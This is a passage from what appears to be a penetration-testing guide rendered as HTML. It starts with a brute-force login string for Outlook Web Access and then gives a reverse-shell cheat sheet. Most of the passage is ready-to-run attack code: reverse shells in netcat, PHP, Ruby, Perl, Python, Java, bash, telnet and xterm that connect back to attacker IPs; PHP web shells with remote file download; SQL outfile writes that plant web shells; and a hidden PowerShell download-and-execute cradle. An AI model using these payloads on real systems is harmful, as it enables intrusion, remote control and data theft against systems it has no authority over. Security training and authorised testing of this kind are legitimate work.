<span class="s2">&quot;/exchweb/bin/auth/owaauth.dll:destination=http%3A</span><span class="si">%2F%2F</span><span class="s2">&lt;target&gt;</span><span class="si">%2F</span><span class="s2">exchange&amp;flags=0&amp;username=&lt;domain&gt;%5C^USER^&amp;password=^PASS^&amp;SubmitCreds=x&amp;trusted=0:reason=:C=/exchweb&quot;</span>
</pre></div>
</div>
<div class="admonition-todo admonition" id="id9">
<p class="admonition-title">Todo</p>
<p>Add a program/binary that an easier syntax, ncrack maybe? Elaborate on the examples, eg. what they will do once executed?</p>
</div>
</section>
</section>
<section id="reverse-shells">
<h3>Reverse Shells<a class="headerlink" href="#reverse-shells" title="Link to this heading"></a></h3>
<p>Once we have figured out some vulnerability or misconfiguration in a running service which allows us to make a connection back to our attack machine, we would like to set up a reverse shell. This can be done through version methods e.g. by using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. The section below has been mostly adapted from <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a>  and <a class="reference external" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a> and more.</p>
<section id="netcat-nc">
<h4>netcat (nc)<a class="headerlink" href="#netcat-nc" title="Link to this heading"></a></h4>
<p>TCP Mode</p>
<ul class="simple">
<li><p>with the -e option</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="mf">10.1.1.1</span> <span class="mi">4444</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>without -e option</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="o">|/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="o">|</span><span class="n">nc</span> <span class="mf">10.0.0.1</span> <span class="mi">1234</span> <span class="o">&gt;/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span>
</pre></div>
</div>
</div></blockquote>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>f in this case is a file name, if you want to have more then one reverse shell with this method you will have to use another letter (a … z) then the one you used intially.</p>
</div>
<p>UDP Mode</p>
<p>Just use the UDP Mode (-u)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">h</span>
<span class="p">[</span><span class="n">v1</span><span class="mf">.10</span><span class="o">-</span><span class="mf">41.1</span><span class="p">]</span>
<span class="n">connect</span> <span class="n">to</span> <span class="n">somewhere</span><span class="p">:</span>  <span class="n">nc</span> <span class="p">[</span><span class="o">-</span><span class="n">options</span><span class="p">]</span> <span class="n">hostname</span> <span class="n">port</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="p">[</span><span class="n">ports</span><span class="p">]</span> <span class="o">...</span>
<span class="n">listen</span> <span class="k">for</span> <span class="n">inbound</span><span class="p">:</span>    <span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="o">-</span><span class="n">p</span> <span class="n">port</span> <span class="p">[</span><span class="o">-</span><span class="n">options</span><span class="p">]</span> <span class="p">[</span><span class="n">hostname</span><span class="p">]</span> <span class="p">[</span><span class="n">port</span><span class="p">]</span>
<span class="n">options</span><span class="p">:</span>
       <span class="o">-</span><span class="n">l</span>                      <span class="n">listen</span> <span class="n">mode</span><span class="p">,</span> <span class="k">for</span> <span class="n">inbound</span> <span class="n">connects</span>
       <span class="o">-</span><span class="n">n</span>                      <span class="n">numeric</span><span class="o">-</span><span class="n">only</span> <span class="n">IP</span> <span class="n">addresses</span><span class="p">,</span> <span class="n">no</span> <span class="n">DNS</span>
       <span class="o">-</span><span class="n">p</span> <span class="n">port</span>                 <span class="n">local</span> <span class="n">port</span> <span class="n">number</span>
       <span class="o">-</span><span class="n">u</span>                      <span class="n">UDP</span> <span class="n">mode</span>
</pre></div>
</div>
</section>
<section id="php">
<h4>PHP<a class="headerlink" href="#php" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p><strong>PHP Web Shell</strong></p></li>
</ul>
<blockquote>
<div><p>This is a kind of Web shell and not a reverse shell.</p>
<p>We can create a new file say (shell.php) on the server containing</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;
</pre></div>
</div>
<p>or</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php echo shell_exec($_GET[&quot;cmd&quot;]); ?&gt;
</pre></div>
</div>
<p>or</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;? passthru($_GET[&quot;cmd&quot;]); ?&gt;
</pre></div>
</div>
<p>which can then be accessed by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://IP/shell.php?cmd=id
</pre></div>
</div>
<p>If there’s a webpage which accepts phpcode to be executed, we can use curl to urlencode the payload and run it.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>curl -G -s http://10.X.X.X/somepage.php?data= --data-urlencode &quot;html=&lt;?php passthru(&#39;ls -lah&#39;); ?&gt;&quot; -b &quot;somecookie=somevalue&quot; | sed &#39;/&lt;html&gt;/,/&lt;\/html&gt;/d&#39;

-G When used, this option will make all data specified with -d, --data, --data-binary or --data-urlencode to be used in an HTTP GET request instead of the POST request that otherwise would be used. The data will be appended to the URL with a  &#39;?&#39; separator.
-data-urlencode &lt;data&gt; (HTTP) Posts data, similar to the other -d, --data options with the exception that this performs URL-encoding.
-b, --cookie &lt;data&gt; (HTTP) Passes the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a &quot;Set-Cookie:&quot; line.  The data should be in the format &quot;NAME1=VALUE1; NAME2=VALUE2&quot;.
</pre></div>
</div>
<p>The sed command in the end</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sed</span> <span class="s1">&#39;/&lt;html&gt;/,/&lt;\/html&gt;/d&#39;</span>
</pre></div>
</div>
<p>deletes the content between &lt;html&gt; and &lt;/html&gt; tag.</p>
<p>If you also want to provide upload functionality (imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php
 if (isset($_REQUEST[&#39;fupload&#39;])) {
  file_put_contents($_REQUEST[&#39;fupload&#39;], file_get_contents(&quot;http://yourIP/&quot; . $_REQUEST[&#39;fupload&#39;]));
 };
 if (isset($_REQUEST[&#39;cmd&#39;])) {
  echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST[&#39;cmd&#39;]) . &quot;&lt;/pre&gt;&quot;;
 }
?&gt;
</pre></div>
</div>
<p>The above can be accessed by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://IP/shell.php?fupload=filename_on_your_webserver
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p><strong>PHP Meterpreter</strong></p></li>
</ul>
<blockquote>
<div><p>We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">php</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">192.168.1.1</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="o">-</span><span class="n">f</span> <span class="n">raw</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">payload</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>We can set the multi-handler in metasploit by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
<span class="nb">set</span> <span class="n">payload</span> <span class="n">php</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
<span class="nb">set</span> <span class="n">LHOST</span> <span class="n">yourIP</span>
<span class="n">run</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p><strong>PHP Reverse Shell</strong></p></li>
</ul>
<blockquote>
<div><p>The code below assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4 or 5 or 6.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">php</span> <span class="o">-</span><span class="n">r</span> <span class="s1">&#39;$sock=fsockopen(&quot;192.168.56.101&quot;,1337);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
</pre></div>
</div>
<p>The above can be connected to by listening on port 1337 by using nc.</p>
</div></blockquote>
</section>
<section id="weevely">
<h4>Weevely<a class="headerlink" href="#weevely" title="Link to this heading"></a></h4>
<p>Weevely also generates a webshell</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">weevely</span> <span class="n">generate</span> <span class="n">password</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">payload</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>which can then be called by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">weevely</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.1.2</span><span class="o">/</span><span class="n">location_of_payload</span> <span class="n">password</span>
</pre></div>
</div>
<p>However, it was not as useful as php meterpreter or a reverse shell.</p>
<div class="admonition-todo admonition" id="id10">
<p class="admonition-title">Todo</p>
<p>Elobrate -&gt; why wasn’t it useful? iirc (really not sure) if you don’t provide a password it will ask for it</p>
</div>
</section>
<section id="ruby">
<h4>Ruby<a class="headerlink" href="#ruby" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;</span><span class="si">%d</span><span class="s1"> &gt;&amp;</span><span class="si">%d</span><span class="s1"> 2&gt;&amp;</span><span class="si">%d</span><span class="s1">&quot;,f,f,f)&#39;</span>
</pre></div>
</div>
</section>
<section id="perl">
<h4>Perl<a class="headerlink" href="#perl" title="Link to this heading"></a></h4>
<div class="highlight-perl notranslate"><div class="highlight"><pre><span></span><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
</pre></div>
</div>
</section>
<section id="python">
<h4>Python<a class="headerlink" href="#python" title="Link to this heading"></a></h4>
<p>TCP</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
</pre></div>
</div>
<p>UDP</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">pty</span><span class="o">,</span><span class="nn">socket</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.10.14.17&quot;</span><span class="p">,</span> <span class="mi">4445</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">putenv</span><span class="p">(</span><span class="s2">&quot;HISTFILE&quot;</span><span class="p">,</span><span class="s1">&#39;/dev/null&#39;</span><span class="p">);</span><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
</div>
</section>
<section id="java">
<h4>Java<a class="headerlink" href="#java" title="Link to this heading"></a></h4>
<div class="highlight-java notranslate"><div class="highlight"><pre><span></span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">()</span>
<span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="o">[</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="s">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">()</span>
</pre></div>
</div>
</section>
<section id="jsp">
<h4>JSP<a class="headerlink" href="#jsp" title="Link to this heading"></a></h4>
<div class="highlight-jsp notranslate"><div class="highlight"><pre><span></span>msfvenom<span class="w"> </span>-p<span class="w"> </span>java/jsp_shell_reverse_tcp<span class="w"> </span>LHOST=192.168.110.129<span class="w"> </span>LPORT=4444<span class="w"> </span>-f<span class="w"> </span>war<span class="w"> </span>&gt;<span class="w"> </span>runme.war
</pre></div>
</div>
</section>
<section id="bash-dev-tcp">
<h4>Bash /dev/tcp<a class="headerlink" href="#bash-dev-tcp" title="Link to this heading"></a></h4>
<p>If a server (attacker machine) is listening on a port:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="n">port</span>
</pre></div>
</div>
<p>then we can use the below to connect</p>
<p>Method 1:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">IP</span><span class="o">/</span><span class="n">Port</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
</pre></div>
</div>
<p>Method 2:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>exec 5&lt;&gt;/dev/tcp/IP/80
cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done

# or:

while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done
</pre></div>
</div>
<p>Method 3:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">0</span><span class="o">&lt;&amp;</span><span class="mi">196</span><span class="p">;</span><span class="n">exec</span> <span class="mi">196</span><span class="o">&lt;&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">IP</span><span class="o">/</span><span class="n">Port</span><span class="p">;</span> <span class="n">sh</span> <span class="o">&lt;&amp;</span><span class="mi">196</span> <span class="o">&gt;&amp;</span><span class="mi">196</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">196</span>

<span class="o">--</span> <span class="n">We</span> <span class="n">may</span> <span class="n">execute</span> <span class="n">the</span> <span class="n">above</span> <span class="n">using</span> <span class="n">bash</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;Aboveline &quot;</span>
</pre></div>
</div>
<p><a class="reference external" href="http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip">Information about Bash Built-in /dev/tcp File (TCP/IP)</a></p>
<p>The following script fetches the front page from Google:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">exec</span> <span class="mi">3</span><span class="o">&lt;&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">www</span><span class="o">.</span><span class="n">google</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="mi">80</span>
<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&quot;GET / HTTP/1.1</span><span class="se">\r\n</span><span class="s2">host: http://www.google.com</span><span class="se">\r\n</span><span class="s2">Connection: close</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span> <span class="o">&gt;&amp;</span><span class="mi">3</span>
<span class="n">cat</span> <span class="o">&lt;&amp;</span><span class="mi">3</span>
</pre></div>
</div>
<ul class="simple">
<li><p>The first line causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket. This is a special form of the exec statement. From the bash man page:</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">exec</span> <span class="p">[</span><span class="o">-</span><span class="n">cl</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">a</span> <span class="n">name</span><span class="p">]</span> <span class="p">[</span><span class="n">command</span> <span class="p">[</span><span class="n">arguments</span><span class="p">]]</span>
</pre></div>
</div>
<p>If command is not specified, any redirections take effect in the current shell, and the return status is 0. So using exec without a command is a way to open files in the current shell.</p>
</div></blockquote>
<ul class="simple">
<li><p>Second line:  After the socket is open we send our HTTP request out the socket with the echo … &gt;&amp;3 command. The request consists of:</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">GET</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">host</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">google</span><span class="o">.</span><span class="n">com</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
</pre></div>
</div>
<p>Each line is followed by a carriage-return and newline, and all the headers are followed by a blank line to signal the end of the request (this is all standard HTTP stuff).</p>
</div></blockquote>
<ul class="simple">
<li><p>Third line: Next we read the response out of the socket using cat &lt;&amp;3, which reads the response and prints it out.</p></li>
</ul>
</section>
<section id="telnet-reverse-shell">
<h4>Telnet Reverse Shell<a class="headerlink" href="#telnet-reverse-shell" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">rm</span> <span class="o">-</span><span class="n">f</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">p</span><span class="p">;</span> <span class="n">mknod</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">p</span> <span class="n">p</span> <span class="o">&amp;&amp;</span> <span class="n">telnet</span> <span class="n">ATTACKING</span><span class="o">-</span><span class="n">IP</span> <span class="mi">80</span> <span class="mi">0</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">p</span>

<span class="n">telnet</span> <span class="n">ATTACKING</span><span class="o">-</span><span class="n">IP</span> <span class="mi">80</span> <span class="o">|</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">|</span> <span class="n">telnet</span> <span class="n">ATTACKING</span><span class="o">-</span><span class="n">IP</span> <span class="mi">443</span>
</pre></div>
</div>
<div class="admonition-todo admonition" id="id11">
<p class="admonition-title">Todo</p>
<p>explain the example above</p>
</div>
</section>
<section id="xterm">
<h4>XTerm<a class="headerlink" href="#xterm" title="Link to this heading"></a></h4>
<p>One of the simplest forms of reverse shell is an xterm session. The following command should be run on the victim server. It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>xterm<span class="w"> </span>-display<span class="w"> </span><span class="m">10</span>.0.0.1:1
</pre></div>
</div>
<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Xnest</span> <span class="p">:</span><span class="mi">1</span> <span class="o">-</span><span class="n">listen</span> <span class="n">tcp</span>
</pre></div>
</div>
<p>You’ll need to authorize the target to connect to you (command also run on your host):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">xhost</span> <span class="o">+</span><span class="n">targetip</span>
</pre></div>
</div>
</section>
<section id="lynx">
<h4>Lynx<a class="headerlink" href="#lynx" title="Link to this heading"></a></h4>
<p>Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs.
This is a big security hole for sites that use lynx “guest accounts” and other public services. More details <a class="reference external" href="http://insecure.org/sploits/lynx.download.html">LynxShell</a></p>
<p>When you start up a lynx client session, you can hit “g” (for goto) and then enter the following URL:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">URL</span> <span class="n">to</span> <span class="nb">open</span><span class="p">:</span> <span class="n">LYNXDOWNLOAD</span><span class="p">:</span><span class="o">//</span><span class="n">Method</span><span class="o">=-</span><span class="mi">1</span><span class="o">/</span><span class="n">File</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span><span class="p">;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">;</span><span class="o">/</span><span class="n">SugFile</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
</pre></div>
</div>
</section>
<section id="mysql">
<h4>MYSQL<a class="headerlink" href="#mysql" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s2">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">ps</span> <span class="mi">3</span><span class="n">c3f70687020706870696e666f28293b203f3e</span>

<span class="n">select</span> <span class="mh">0x3c3f70687020706870696e666f28293b203f3e</span> <span class="n">into</span> <span class="n">outfile</span> <span class="s2">&quot;/var/www/html/blogblog/wp-content/uploads/phpinfo.php&quot;</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SELECT</span> <span class="s2">&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span> <span class="n">into</span> <span class="n">dumpfile</span> <span class="s1">&#39;/var/www/html/shell.php&#39;</span><span class="p">;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>If you have sql-shell from sqlmap/ phpmyadmin, we can read files by using the load_file function.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">select</span> <span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="reverse-shell-from-windows">
<h4>Reverse Shell from Windows<a class="headerlink" href="#reverse-shell-from-windows" title="Link to this heading"></a></h4>
<p>If there’s a way, we can execute code from windows, we may try</p>
<ul class="simple">
<li><p>Uploading ncat and executing it</p></li>
<li><p>Powershell Empire/ Metasploit Web-Delivery Method</p></li>
<li><p>Invoke-Shellcode (from powersploit)</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Powershell</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">NoP</span> <span class="o">-</span><span class="n">NonI</span> <span class="o">-</span><span class="n">W</span> <span class="n">Hidden</span> <span class="o">-</span><span class="n">Exec</span> <span class="n">Bypass</span> <span class="n">IEX</span> <span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">Net</span><span class="o">.</span><span class="n">WebClient</span><span class="p">)</span><span class="o">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://YourIPAddress:8000/Invoke-Shellcode.ps1&#39;</span><span class="p">);</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">Shellcode</span> <span class="o">-</span><span class="n">Payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_https</span> <span class="o">-</span><span class="n">Lhost</span> <span class="n">YourIPAddress</span> <span class="o">-</span><span class="n">Lport</span> <span class="mi">4444</span> <span class="o">-</span><span class="n">Force</span><span class="s2">&quot;</span>
</pre></div>
</div>
</div></blockquote>
<div class="admonition-todo admonition" id="id12">
<p class="admonition-title">Todo</p>
<p>add Nishang?</p>
</div>
</section>
<section id="msf-meterpreter-elf">
<h4>MSF Meterpreter ELF<a class="headerlink" href="#msf-meterpreter-elf" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="o">-</span><span class="n">f</span> <span class="n">elf</span> <span class="o">-</span><span class="n">o</span> <span class="n">met</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">10.10</span><span class="o">.</span><span class="n">XX</span><span class="mf">.110</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">4446</span>
</pre></div>
</div>
</section>
<section id="metasploit-msfvenom">
<h4>Metasploit MSFVenom<a class="headerlink" href="#metasploit-msfvenom" title="Link to this heading"></a></h4>
<p>Ever wondered from where the above shells came from? Maybe try msfvenom and grep for cmd/unix</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">l</span> <span class="n">payloads</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">&quot;cmd/unix&quot;</span>
<span class="o">**</span><span class="n">snip</span><span class="o">**</span>
   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">bind_awk</span>                                   <span class="n">Listen</span> <span class="k">for</span> <span class="n">a</span> <span class="n">connection</span> <span class="ow">and</span> <span class="n">spawn</span> <span class="n">a</span> <span class="n">command</span> <span class="n">shell</span> <span class="n">via</span> <span class="n">GNU</span> <span class="n">AWK</span>
   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">bind_inetd</span>                                 <span class="n">Listen</span> <span class="k">for</span> <span class="n">a</span> <span class="n">connection</span> <span class="ow">and</span> <span class="n">spawn</span> <span class="n">a</span> <span class="n">command</span> <span class="n">shell</span> <span class="p">(</span><span class="n">persistent</span><span class="p">)</span>
   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">bind_lua</span>                                   <span class="n">Listen</span> <span class="k">for</span> <span class="n">a</span> <span class="n">connection</span> <span class="ow">and</span> <span class="n">spawn</span> <span class="n">a</span> <span class="n">command</span> <span class="n">shell</span> <span class="n">via</span> <span class="n">Lua</span>
   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">bind_netcat</span>                                <span class="n">Listen</span> <span class="k">for</span> <span class="n">a</span> <span class="n">connection</span> <span class="ow">and</span> <span class="n">spawn</span> <span class="n">a</span> <span class="n">command</span> <span class="n">shell</span> <span class="n">via</span> <span class="n">netcat</span>
   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">bind_perl</span>                                  <span class="n">Listen</span> <span class="k">for</span> <span class="n">a</span> <span class="n">connection</span> <span class="ow">and</span> <span class="n">spawn</span> <span class="n">a</span> <span class="n">command</span> <span class="n">shell</span> <span class="n">via</span> <span class="n">perl</span>
